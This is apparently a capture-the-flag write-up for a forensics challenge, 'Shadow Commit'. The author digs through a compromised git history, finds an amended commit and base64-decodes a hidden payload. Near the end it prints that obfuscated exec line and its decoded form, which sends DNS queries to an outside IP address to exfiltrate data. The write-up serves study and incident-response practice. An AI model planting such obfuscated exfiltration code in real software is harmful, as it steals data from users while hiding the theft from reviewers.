# D8. Shadow Commit

## Challenge

We've identified the piece of software that's responsible for the exfiltration, and it's one of Personalyz.io's internally developed apps... that's not good. We reach out to the developer of the software and they quickly report back that their repository was compromised. Looks like all we received was a .git directory—no source files, no README, just the version history.  

Somewhere in the commit log, a change was made that allowed the threat actor to use it to exfiltrate data. Your task is to uncover the commit ID of that shady operation and identify the malicious IPv4 address.  

**Objectives**

Find the commit hash where the malicious change was introduced and obtain the malicious IPv4 address.

**Flag Format**

###.###.###.###  

**Additional Resources**
- [git docs](https://docs.github.com/en)  
- [CyberChef](https://gchq.github.io/CyberChef/)  

## How I found the flag

1. Easy way: There was the IP address I found in the last challenge, 251.91.13.37. This is the flag.
2. Hard way: I wanted to try to find the IP in the file that I was given. 
3. I checked the files and logs. There was a HEAD file, so I opened it.
![HEAD file](/assets/img/target2025/target2025_d8_1.png)
4. The objective said "malicious change" which was the clue. I searched for "amend", and there was only one amend commit.
![amend commit](/assets/img/target2025/target2025_d8_2.png)  
5. There two parts of commit IDs: a50a7657e3a00c0aa63455d7ac81e73f69f273b1, b188b42c34f772d2d9ccc006692d65cd597fc57d  
![git bash](/assets/img/target2025/target2025_d8_3.png)
6. Opened Git Bash to find some information using the IDs I found.
7. I tried git --git-dir=.git show a50a7657e3a00c0aa63455d7ac81e73f69f273b1. It showed the details and changes of that commit in the Git repository .git.
![git bash](/assets/img/target2025/target2025_d8_4.png)
8. The other one: git --git-dir=.git show b188b42c34f772d2d9ccc006692d65cd597fc57d.
![git bash](/assets/img/target2025/target2025_d8_5.png)
9. There was some encrypted data. One of the hints of this challenge was "decrypt," so I assumed I should decrypt something to get the flag.
10. I used CyberChef to decrypt the data. I tried base64 decoding and found something useful: 
![CyberChef](/assets/img/target2025/target2025_d8_6.png)
11. I tried to decode it step by step and found the IP:
exec(ute("ZGVmIHEoc2QsIHQpOgogICAgdWRwKG1ha2VfcXVlcnkoZiJ7c2R9IiwgdCksICIyNTEuOTEuMTMuMzciLCBwb3J0PTBvNjUp"))
![CyberChef](/assets/img/target2025/target2025_d8_7.png)
12. def q(sd, t): udp(make_query(f"{sd}", t), "251.91.13.37", port=0o65)


**Flag: 251.91.13.37**
